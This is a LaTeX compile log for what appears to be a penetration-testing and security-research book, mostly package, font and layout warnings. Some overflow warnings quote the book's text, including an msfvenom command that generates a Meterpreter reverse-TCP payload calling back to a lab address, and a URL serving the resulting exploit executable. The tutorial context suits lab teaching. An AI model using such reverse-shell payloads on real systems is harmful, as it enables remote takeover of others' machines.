Package xcolor Info: Model `tHsb' substituted by `hsb' on input line 1373.
Package xcolor Info: Model `HSB' substituted by `hsb' on input line 1374.
Package xcolor Info: Model `Gray' substituted by `gray' on input line 1375.
Package xcolor Info: Model `wave' substituted by `hsb' on input line 1376.
)
(c:/texlive/2023/texmf-dist/tex/latex/listings/listings.sty
\lst@mode=\count347
\lst@gtempboxa=\box113
\lst@token=\toks42
\lst@length=\count348
\lst@currlwidth=\dimen259
\lst@column=\count349
\lst@pos=\count350
\lst@lostspace=\dimen260
\lst@width=\dimen261
\lst@newlines=\count351
\lst@lineno=\count352
\lst@maxwidth=\dimen262

(c:/texlive/2023/texmf-dist/tex/latex/listings/lstmisc.sty
File: lstmisc.sty 2023/02/27 1.9 (Carsten Heinz)
\c@lstnumber=\count353
\lst@skipnumbers=\count354
\lst@framebox=\box114
)
(c:/texlive/2023/texmf-dist/tex/latex/listings/listings.cfg
File: listings.cfg 2023/02/27 1.9 listings configuration
))
Package: listings 2023/02/27 1.9 (Carsten Heinz)

(c:/texlive/2023/texmf-dist/tex/latex/booktabs/booktabs.sty
Package: booktabs 2020/01/12 v1.61803398 Publication quality tables
\heavyrulewidth=\dimen263
\lightrulewidth=\dimen264
\cmidrulewidth=\dimen265
\belowrulesep=\dimen266
\belowbottomsep=\dimen267
\aboverulesep=\dimen268
\abovetopsep=\dimen269
\cmidrulesep=\dimen270
\cmidrulekern=\dimen271
\defaultaddspace=\dimen272
\@cmidla=\count355
\@cmidlb=\count356
\@aboverulesep=\dimen273
\@belowrulesep=\dimen274
\@thisruleclass=\count357
\@lastruleclass=\count358
\@thisrulewidth=\dimen275
)
(c:/texlive/2023/texmf-dist/tex/latex/tools/array.sty
Package: array 2022/09/04 v2.5g Tabular extension package (FMi)
\col@sep=\dimen276
\ar@mcellbox=\box115
\extrarowheight=\dimen277
\NC@list=\toks43
\extratabsurround=\skip83
\backup@length=\skip84
\ar@cellbox=\box116
)
(c:/texlive/2023/texmf-dist/tex/latex/makecell/makecell.sty
Package: makecell 2009/08/03 V0.1e Managing of Tab Column Heads and Cells
\rotheadsize=\dimen278
\c@nlinenum=\count359
\TeXr@lab=\toks44
) (./ut.aux)
\openout1 = `ut.aux'.

LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 194.
LaTeX Font Info:    Trying to load font information for TS1+cmr on input line 1
94.

(c:/texlive/2023/texmf-dist/tex/latex/base/ts1cmr.fd
File: ts1cmr.fd 2023/04/13 v2.5m Standard LaTeX font definitions
)
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for TU/lmr/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for PD1/pdf/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.
LaTeX Font Info:    Checking defaults for PU/pdf/m/n on input line 194.
LaTeX Font Info:    ... okay on input line 194.

*geometry* driver: auto-detecting
*geometry* detected driver: xetex
*geometry* verbose mode - [ preamble ] result:
* driver: xetex
* paper: custom
* layout: <same size as paper>
* layoutoffset:(h,v)=(0.0pt,0.0pt)
* bindingoffset: 8.67204pt
* modes: twoside 
* h-part:(L,W,R)=(68.65627pt, 312.92926pt, 43.36243pt)
* v-part:(T,H,B)=(54.2025pt, 534.79756pt, 61.42993pt)
* \paperwidth=433.62pt
* \paperheight=650.43pt
* \textwidth=312.92926pt
* \textheight=534.79756pt
* \oddsidemargin=5.05832pt
* \evensidemargin=-28.90756pt
* \topmargin=-48.13498pt
* \headheight=21.0pt
* \headsep=18.06749pt
* \topskip=10.0pt
* \footskip=25.29494pt
* \marginparwidth=125.0pt
* \marginparsep=7.0pt
* \columnsep=10.0pt
* \skip\footins=9.0pt plus 4.0pt minus 2.0pt
* \hoffset=0.0pt
* \voffset=0.0pt
* \mag=1000
* \@twocolumnfalse
* \@twosidetrue
* \@mparswitchtrue
* \@reversemarginfalse
* (1in=72.27pt=25.4mm, 1cm=28.453pt)


Package fontspec Info: Adjusting the maths setup (use [no-math] to avoid
(fontspec)             this).

\symlegacymaths=\mathgroup4
LaTeX Font Info:    Overwriting symbol font `legacymaths' in version `bold'
(Font)                  OT1/cmr/m/n --> OT1/cmr/bx/n on input line 194.
LaTeX Font Info:    Redeclaring math accent \acute on input line 194.
LaTeX Font Info:    Redeclaring math accent \grave on input line 194.
LaTeX Font Info:    Redeclaring math accent \ddot on input line 194.
LaTeX Font Info:    Redeclaring math accent \tilde on input line 194.
LaTeX Font Info:    Redeclaring math accent \bar on input line 194.
LaTeX Font Info:    Redeclaring math accent \breve on input line 194.
LaTeX Font Info:    Redeclaring math accent \check on input line 194.
LaTeX Font Info:    Redeclaring math accent \hat on input line 194.
LaTeX Font Info:    Redeclaring math accent \dot on input line 194.
LaTeX Font Info:    Redeclaring math accent \mathring on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Gamma on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Delta on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Theta on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Lambda on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Xi on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Pi on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Sigma on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Upsilon on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Phi on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Psi on input line 194.
LaTeX Font Info:    Redeclaring math symbol \Omega on input line 194.
LaTeX Font Info:    Redeclaring math symbol \mathdollar on input line 194.
LaTeX Font Info:    Redeclaring symbol font `operators' on input line 194.
LaTeX Font Info:    Encoding `OT1' has changed to `TU' for symbol font
(Font)              `operators' in the math version `normal' on input line 194.

LaTeX Font Info:    Overwriting symbol font `operators' in version `normal'
(Font)                  OT1/cmr/m/n --> TU/InfoOTDisp(0)/m/n on input line 194.

LaTeX Font Info:    Encoding `OT1' has changed to `TU' for symbol font
(Font)              `operators' in the math version `bold' on input line 194.
LaTeX Font Info:    Overwriting symbol font `operators' in version `bold'
(Font)                  OT1/cmr/bx/n --> TU/InfoOTDisp(0)/m/n on input line 194
.
LaTeX Font Info:    Overwriting symbol font `operators' in version `normal'
(Font)                  TU/InfoOTDisp(0)/m/n --> TU/InfoOTDisp(0)/m/n on input 
line 194.
LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `normal'
(Font)                  OT1/cmr/m/it --> TU/InfoOTDisp(0)/m/it on input line 19
4.
LaTeX Font Info:    Overwriting math alphabet `\mathbf' in version `normal'
(Font)                  OT1/cmr/bx/n --> TU/InfoOTDisp(0)/b/n on input line 194
.
LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `normal'
(Font)                  OT1/cmss/m/n --> TU/lmss/m/n on input line 194.
LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `normal'
(Font)                  OT1/cmtt/m/n --> TU/CourierNew(0)/m/n on input line 194
.
LaTeX Font Info:    Overwriting symbol font `operators' in version `bold'
(Font)                  TU/InfoOTDisp(0)/m/n --> TU/InfoOTDisp(0)/b/n on input 
line 194.
LaTeX Font Info:    Overwriting math alphabet `\mathit' in version `bold'
(Font)                  OT1/cmr/bx/it --> TU/InfoOTDisp(0)/b/it on input line 1
94.
LaTeX Font Info:    Overwriting math alphabet `\mathsf' in version `bold'
(Font)                  OT1/cmss/bx/n --> TU/lmss/b/n on input line 194.
LaTeX Font Info:    Overwriting math alphabet `\mathtt' in version `bold'
(Font)                  OT1/cmtt/m/n --> TU/CourierNew(0)/b/n on input line 194
.
LaTeX Info: Redefining \microtypecontext on input line 194.
Package microtype Info: Applying patch `item' on input line 194.
Package microtype Info: Applying patch `toc' on input line 194.
Package microtype Info: Applying patch `eqnum' on input line 194.
Package microtype Info: Applying patch `footnote' on input line 194.
Package microtype Info: Applying patch `verbatim' on input line 194.
Package microtype Info: Character protrusion enabled (level 2).
Package microtype Info: Using default protrusion set `alltext'.
Package microtype Info: No adjustment of tracking.
Package microtype Info: No adjustment of spacing.
Package microtype Info: No adjustment of kerning.
Package microtype Info: Loading generic protrusion settings for font family
(microtype)             `InfoOTDisp' (encoding: TU).
(microtype)             For optimal results, create family-specific settings.
(microtype)             See the microtype manual for details.

Package microtype Warning: Unknown slot number of character
(microtype)                `\k A'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\u A'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\k a'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\u a'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'C'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v C'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'c'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v c'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v D'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v d'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.

Package microtype Info: Character `\dj ' is missing
(microtype)             in font `\TU/InfoOTDisp(0)/m/n/10'.
(microtype)             Ignoring protrusion settings for this character.

Package microtype Warning: Unknown slot number of character
(microtype)                `\k E'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v E'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\k e'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v e'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\u G'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\u g'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\.I'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'L'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v L'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'l'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v l'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'N'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v N'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'n'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v n'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\H O'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\H o'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'R'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v R'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'r'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v r'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'S'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\c S'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'s'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\c s'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\c T'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v T'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\c t'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\v t'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\H U'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\r U'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\H u'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\r u'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'Z'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\.Z'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\'z'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.


Package microtype Warning: Unknown slot number of character
(microtype)                `\.z'
(microtype)                in font encoding `TU' in inheritance list
(microtype)                `microtype.cfg/411(protrusion)'.

Package hyperref Info: Link coloring ON on input line 194.
(./ut.out) (./ut.out)
\@outlinefile=\write7
\openout7 = `ut.out'.

Package caption Info: Begin \AtBeginDocument code.
Package caption Info: listings package is loaded.
Package caption Info: End \AtBeginDocument code.
\c@lstlisting=\count360
\openout4 = `ut.ent'.



LaTeX Font Warning: Font shape `TU/InfoOTDisp(0)/m/it' undefined
(Font)              using `TU/InfoOTDisp(0)/m/n' instead on input line 201.

[1

\openout5 = `ut.ist'.

] [2

]
Package microtype Info: Loading generic protrusion settings for font family
(microtype)             `EurostileExtd' (encoding: TU).
(microtype)             For optimal results, create family-specific settings.
(microtype)             See the microtype manual for details.
 (c:/texlive/2023/texmf-dist/tex/latex/microtype/mt-cmr.cfg
File: mt-cmr.cfg 2013/05/19 v2.2 microtype config. file: Computer Modern Roman 
(RS)
) [1]
[2

] (./ut.toc)
\tf@toc=\write8
\openout8 = `ut.toc'.

 [1

] [2

] [3] [4

] [5] [6

]
\openout4 = `ut.ent'.


Underfull \vbox (badness 10000) has occurred while \output is active []

 [7]
[8] [9

] [10

]
Chapter 1.
Package microtype Info: Loading generic protrusion settings for font family
(microtype)             `EurostileW01' (encoding: TU).
(microtype)             For optimal results, create family-specific settings.
(microtype)             See the microtype manual for details.

LaTeX Font Warning: Font shape `TU/EurostileW01(0)/b/n' undefined
(Font)              using `TU/EurostileW01(0)/m/n' instead on input line 317.

[1

]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [2]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [3]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [4]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [5]
Overfull \hbox (1.29799pt too wide) in paragraph at lines 395--396
[]\TU/InfoOTDisp(0)/m/it/10 Later on in those war campaigns, during Desert Stor
m, some people that I worked
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [6]
[7]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [8]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [9]
[10]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [11]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [12]
[13] [14]
Chapter 2.

Underfull \vbox (badness 10000) has occurred while \output is active []

 [15

]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [16]
[17]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [18]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [19]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [20]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [21]
Overfull \hbox (3.25774pt too wide) in paragraph at lines 553--554
\TU/InfoOTDisp(0)/m/it/10 terms for describing experiments. Also I would like t
o suggest why quasi-experiments
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [22]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [23]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [24]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [25]
[26]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [27]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [28]
File: images/WeidmanCH4PresentationB2.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB2.jpg>


LaTeX Font Warning: Font shape `TU/InfoOTDisp(0)/b/n' undefined
(Font)              using `TU/InfoOTDisp(0)/m/n' instead on input line 647.


LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB1.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB1.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB3.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB3.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB4.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB4.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB5.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB5.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.


Overfull \hbox (19.33075pt too wide) in paragraph at lines 687--688
[]\TU/InfoOTDisp(0)/m/it/10 msfvenom <target computer specific payload><listeni
ng computer address><listening
 []

File: images/WeidmanCH4PresentationB6.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB6.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.


Underfull \vbox (badness 10000) has occurred while \output is active []

 [29]
Overfull \hbox (0.23076pt too wide) in paragraph at lines 697--698
[]\TU/InfoOTDisp(0)/m/it/10 msfvenom windows/meterpreter/reverse_tcp LHOST=192.
168.56.101 LPORT=12345
 []

File: images/WeidmanCH4PresentationB7.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB7.jpg>
[30]

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB8.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB8.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB9.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB9.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

File: images/WeidmanCH4PresentationB10.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB10.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.


Overfull \hbox (5.4352pt too wide) in paragraph at lines 745--746
\TU/InfoOTDisp(0)/m/it/10 tory that holds the file with the []exploit in it. ht
tp://192.168.56.101/chapter4example.exe.
 []

File: images/WeidmanCH4PresentationB11.jpg Graphic file (type bmp)
<images/WeidmanCH4PresentationB11.jpg>

LaTeX Warning: `!h' float specifier changed to `!ht'.

[31] [32] [33] [34] [35] [36] [37]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [38

]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [39]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [40]
[41]
LaTeX Font Info:    Font shape `TU/CourierNew(0)/m/n' will be
(Font)              scaled to size 10.0pt on input line 829.
Package microtype Info: Loading generic protrusion settings for font family
(microtype)             `CourierNew' (encoding: TU).
(microtype)             For optimal results, create family-specific settings.
(microtype)             See the microtype manual for details.

Underfull \vbox (badness 10000) has occurred while \output is active []

 [42]
Overfull \hbox (2.70807pt too wide) in paragraph at lines 829--829
[]\TU/InfoOTDisp(0)/m/it/10 OAT-002 Token Cracking Mass enumeration of coupon n
umbers, voucher codes,
 []

Missing character: There is no ̂ (U+0302) in font InfoOTDisp-Book/OT:script=lat
n;language=dflt;mapping=tex-text;!
Missing character: There is no ̂ (U+0302) in font InfoOTDisp-Book/OT:script=lat
n;language=dflt;mapping=tex-text;!
[43]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [44]
Overfull \hbox (5.54852pt too wide) in paragraph at lines 863--864
[]\TU/InfoOTDisp(0)/m/it/10 _____. ”http://php.net/manual/en/security.database.
sql-injection.php” INTERNET.
 []


Overfull \hbox (7.56175pt too wide) in paragraph at lines 865--866
[]\TU/InfoOTDisp(0)/m/it/10 _____. SCRT Information Security, ”https://www.scrt
.ch/en/[]attack/downloads/mini-
 []


Overfull \hbox (19.49174pt too wide) in paragraph at lines 867--868
[]\TU/InfoOTDisp(0)/m/it/10 _____. SCRT Information Security, ”https://www.scrt
.ch/outils/mms/mms_manual.pdf”
 []


Overfull \hbox (140.02719pt too wide) in paragraph at lines 869--870
[]\TU/InfoOTDisp(0)/m/it/10 Fresnillo, Rodolfo Resendez. YouTube, ”MiniMysqlato
r & Pblind”, ”https://www.youtube.com/watch?v=uK3_qR3Kn_g”
 []


Overfull \hbox (16.05519pt too wide) in paragraph at lines 871--872
[]\TU/InfoOTDisp(0)/m/it/10 _____. ”https://www.nist.gov/news-events/events/201
7/03/cybersecurity-framework-
 []

[45]
Overfull \hbox (5.59187pt too wide) in paragraph at lines 901--902
\TU/InfoOTDisp(0)/m/it/10 for profound change’,”Medium. http://searchsecurity.t
echtarget.com/opinion/Wendy-
 []


Overfull \hbox (12.18074pt too wide) in paragraph at lines 903--904
\TU/InfoOTDisp(0)/m/it/10 http://searchsecurity.techtarget.com/opinion/Wendy-Na
ther-Were-on-a-trajectory-for-
 []


Overfull \hbox (118.93698pt too wide) in paragraph at lines 905--906
[]\TU/InfoOTDisp(0)/m/it/10 Shadish, William. CV, University of California Merc
ed. INTERNET: http://faculty.ucmerced.edu/wshadish/shadish-
 []


Overfull \hbox (177.4143pt too wide) in paragraph at lines 905--906
\TU/InfoOTDisp(0)/m/it/10 cv-jan-2015. Shadish, William. Biographical sketch, U
niversity of California Merced.http://faculty.ucmerced.edu/wshadish/biosketch. 

 []


Overfull \hbox (0.40852pt too wide) in paragraph at lines 907--908
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: http://www.ipr.northwestern.edu/wo
rkshops/annual-summer-
 []


Overfull \hbox (23.18741pt too wide) in paragraph at lines 907--908
\TU/InfoOTDisp(0)/m/it/10 workshops/quasi-experimental-design-and-analysis/ Thi
s workshop shows that Shadish’s
 []


Overfull \hbox (25.81075pt too wide) in paragraph at lines 911--912
\TU/InfoOTDisp(0)/m/it/10 http://www.primalsecurity.net/0x0-[]exploit-tutorial-
buffer-overflow-vanilla-eip-overwrite-
 []


Overfull \hbox (1.50409pt too wide) in paragraph at lines 915--916
[]\TU/InfoOTDisp(0)/m/it/10 Raspberry Pi Kali Download: https://docs.kali.org/k
ali-on-arm/install-kali-linux-
 []


Overfull \hbox (29.55742pt too wide) in paragraph at lines 917--918
[]\TU/InfoOTDisp(0)/m/it/10 Powershell to get the []hash of a download on Windo
ws 10: https://docs.microsoft.com/en-
 []


Overfull \hbox (7.98074pt too wide) in paragraph at lines 917--918
\TU/InfoOTDisp(0)/m/it/10 us/powershell/module/microsoft.powershell.utility/get
-filehash?view=powershell-5.1
 []


Overfull \hbox (1.4752pt too wide) in paragraph at lines 919--920
[]\TU/InfoOTDisp(0)/m/it/10 _____. https://unix.stackexchange.com/questions/151
547/linux-set-date-through-
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [46]
Overfull \hbox (5.18852pt too wide) in paragraph at lines 925--926
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://www.aircrack-ng.org/doku.p
hp?id=compatibility_drivers 
 []


Overfull \hbox (9.93852pt too wide) in paragraph at lines 941--942
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://www.raspberrypi.org/docume
ntation/[]configuration/raspi-
 []


Overfull \hbox (0.21852pt too wide) in paragraph at lines 943--944
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://www.walmart.com/ip/TP-LINK
-TL-WN722N-N150-High-
 []


Overfull \hbox (2.17853pt too wide) in paragraph at lines 945--946
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://www.amazon.com/Alfa-AWUS03
6NH-802-11g-Wireless-
 []


Overfull \hbox (27.11853pt too wide) in paragraph at lines 949--950
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://www.csoonline.com/article/
2462478/microsoft-subnet/hacker-
 []


Overfull \hbox (201.91855pt too wide) in paragraph at lines 953--954
[]\TU/InfoOTDisp(0)/m/it/10 Reddit Owned : _____. INTERNET: https://www.reddit.
com/r/Defcon/comments/2d16lk/your_pineapple_has_been_owned_son/#bottom-
 []


Overfull \hbox (7.32187pt too wide) in paragraph at lines 957--958
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://capec.mitre.org/data/defin
itions/1000.html ”Mechanisms
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [47]
Overfull \hbox (2.0644pt too wide) in paragraph at lines 977--978
[]\TU/InfoOTDisp(0)/m/it/10 _____. INTERNET: https://capec.mitre.org/data/defin
itions/110.html SOAP ”CAPEC-
 []

[48]
Overfull \hbox (7.09776pt too wide) in paragraph at lines 1026--1027
\TU/InfoOTDisp(0)/m/it/10 between descriptive and explanatory causation and mol
ar and molecular causation.$[]$...
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [49]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [50]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [51]
Overfull \hbox (6.82054pt too wide) in paragraph at lines 1104--1105
[]\TU/InfoOTDisp(0)/m/it/10 Lin, Herbert, Ibidem., p. 103: ”According to the CI
A, human intelligence (HUMINT)–
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [52]
Underfull \vbox (badness 10000) has occurred while \output is active []

 [53]
(./chapters/bastion_host.tex [54]
Chapter 3.
[55

] [56]
Overfull \hbox (11.30107pt too wide) in paragraph at lines 68--68
|[]\TU/EurostileW01(0)/b/n/14.4 Proxy: Providing Standoff Distance and a Planne
d
 []

[57] [58] [59]
LaTeX Font Info:    Font shape `TU/CourierNew(0)/m/n' will be
(Font)              scaled to size 9.0pt on input line 133.
 [60]
Overfull \hbox (26.75406pt too wide) in paragraph at lines 159--166
\TU/InfoOTDisp(0)/m/it/10 <email_notification>yes</email_notification> <email_t
o>sammy@example.com</email_to>
 []


Overfull \hbox (61.25406pt too wide) in paragraph at lines 159--166
\TU/InfoOTDisp(0)/m/it/10 <smtp_server>mail.example.com.</smtp_server> <email_f
rom>sammy@example.com</email_from>
 []

[61]) (./chapters/basic_pentesting.tex [62]
Chapter 4.

